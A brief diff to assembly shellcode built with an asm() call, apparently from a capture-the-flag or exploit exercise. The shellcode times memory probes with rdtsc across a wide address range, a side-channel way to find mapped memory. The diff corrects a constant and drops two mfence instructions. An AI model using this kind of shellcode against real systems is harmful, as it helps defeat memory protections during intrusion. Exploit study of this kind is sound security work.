@@ -10,7 +10,7 @@ assembled_shellcode = asm("""
         mov r12, 0x1000000000        
         mov r13, 0x10000000000
         mov r14, 0
-        mov r15, 040
+        mov r15, 0x40
         
     search_loop:
         cmp r12, r13
@@ -19,7 +19,6 @@ assembled_shellcode = asm("""
         
         
         rdtsc
-        mfence
         shl rdx, 32
         or rax, rdx
         mov r8, rax                   
@@ -29,7 +28,6 @@ assembled_shellcode = asm("""
         mfence
         
         rdtsc
-        mfence
         shl rdx, 32
         or rax, rdx
         sub rax, r8                    
